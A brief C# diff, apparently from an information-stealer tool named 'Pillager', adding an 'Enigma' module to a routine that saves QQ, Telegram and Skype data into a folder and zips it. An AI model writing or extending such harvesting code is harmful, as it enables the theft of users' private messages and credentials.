@@ -36,6 +36,7 @@ namespace Pillager
             QQ.Save(savepath);
             Telegram.Save(savepath);
             Skype.Save(savepath);
+            Enigma.Save(savepath);
 
             //ZIP
             ZipFile.CreateFromDirectory(savepath, savezippath);
